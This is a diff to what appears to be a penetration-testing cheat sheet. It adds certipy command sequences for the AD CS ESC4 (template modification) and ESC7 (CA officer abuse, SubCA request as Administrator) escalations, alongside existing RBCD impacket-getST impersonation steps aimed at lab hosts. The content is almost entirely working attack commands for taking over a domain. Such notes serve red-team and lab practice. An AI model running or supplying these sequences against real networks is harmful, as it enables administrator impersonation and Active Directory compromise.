@@ -1822,6 +1822,18 @@ add_computer plaintext plaintext123
 set_rbcd lab-dc$ plaintext$
 ## RBCD
 impacket-getST -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.228.236 lab.local/'plaintext$':plaintext123
+
+# ESC 4
+certipy template -u 'user' -p 'Password' -ca CA_Name -template ESC4 -save-old -dc-ip 10.129.228.236
+## recover
+certipy template -u 'user' -p 'Password' -ca CA_Name -template ESC4 -configuration ESC4.json
+
+# ESC 7
+certipy ca -u 'user@lab.local' -p 'Password' -ca CA_Name -enable-template 'SubCA'
+certipy ca -u 'user@lab.local' -p 'Password' -ca CA_Name -add-officer ManageCertificates_User
+certipy req -u 'user@lab.local' -p 'Password' -ca CA_Name -template SubCA -upn Administrator
+certipy ca -u 'user@lab.local' -p 'Password' -ca CA_Name -issue-request 31
+certipy req -u 'user@lab.local' -p 'Password' -ca CA_Name -retrieve 31
 ```
 #### PassTheCert
 ```powershell
